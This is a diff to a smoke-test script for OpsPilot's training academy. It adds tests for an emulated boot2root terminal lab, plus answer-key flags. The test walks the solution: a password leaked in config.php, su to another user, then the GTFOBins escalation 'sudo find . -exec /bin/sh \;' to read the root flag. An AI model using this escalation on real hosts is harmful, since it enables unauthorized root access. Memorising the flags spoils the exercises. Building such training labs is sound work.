@@ -5706,6 +5706,8 @@ def main():
             "xss-stored": "FLAG{stored_xss_encode_on_output}",
             # arcade: hack the game you're given (client-trusted score)
             "hack-the-clicker": "FLAG{never_trust_the_client_score}",
+            # The Grid: boot2root terminal box (root flag is the objective)
+            "the-sentinel": "FLAG{b00t2r00t_gtfo_via_sudo_find}",
         }
         # every lab must be covered so range_all is reachable
         assert set(_solutions) == set(_aca._LABS), \
@@ -5809,6 +5811,33 @@ def main():
         print(f"code dojo: {_dojo.TOTAL_CHALLENGES} write-real-code challenges, server-graded "
               "on hidden tests (no answer leak), wrong-output rejection, XP-once, "
               "code_ninja/dojo_master badges OK")
+
+        # ==== v1.75.0: The Grid — interactive boot2root terminal (SAFE emulator) ====
+        _boot = c.post("/api/academy/shell/start").json()
+        assert any("THE GRID" in l for l in _boot["lines"]) and "www-data@" in _boot["prompt"], _boot
+        def _sh(line):
+            return c.post("/api/academy/shell/exec", json={"line": line}).json()
+        # permissions hold: www-data cannot read jordan's 700 home
+        assert "Permission denied" in "\n".join(_sh("cat /home/jordan/user.txt")["lines"])
+        # enumerate -> leak password -> pivot to jordan
+        assert any("Summer2024" in l for l in _sh("cat /var/www/html/config.php")["lines"])
+        assert _sh("su jordan")["awaiting_password"] is True
+        _asj = _sh("Summer2024!")
+        assert _asj["user"] == "jordan" and _asj["awaiting_password"] is False, _asj
+        # user flag now readable; wrong password would have failed (negative already covered in unit)
+        assert any("FLAG{" in l for l in _sh("cat /home/jordan/user.txt")["lines"])
+        # sudo -l reveals the GTFOBins path; exploit it to root
+        assert any("NOPASSWD" in l and "find" in l for l in _sh("sudo -l")["lines"])
+        _root = _sh("sudo find . -exec /bin/sh \\;")
+        assert _root["user"] == "root", _root
+        _rf = _sh("cat /root/root.txt")["lines"]
+        assert any("FLAG{b00t2r00t_gtfo_via_sudo_find}" == l for l in _rf), _rf
+        # a DIFFERENT user's box is isolated (fresh session starts as www-data)
+        assert lc.post("/api/academy/shell/start").json()["prompt"].startswith("www-data@")
+        assert "Permission denied" in "\n".join(
+            lc.post("/api/academy/shell/exec", json={"line": "cat /root/root.txt"}).json()["lines"])
+        print("the grid: interactive boot2root terminal — enum -> cred-reuse pivot (su) -> "
+              "sudo/GTFOBins privesc -> root flag, permission model + per-user session isolation OK")
 
         # ==== v1.64.0: vCISO scorecard PDF — the board-ready QBR deliverable ====
         from app.services import vcio as _vcio64
@@ -6650,7 +6679,7 @@ def main():
         print("tunnel watchdog: script parses, restarts cloudflared (systemd/docker) + "
               "app stack, installs a 2-min timer, disk-safe prune (no volumes) OK")
 
-    print("\n=== OpsPilot v1.74.0 SMOKE TEST PASSED ===")
+    print("\n=== OpsPilot v1.75.0 SMOKE TEST PASSED ===")
 
 if __name__ == "__main__":
     main()
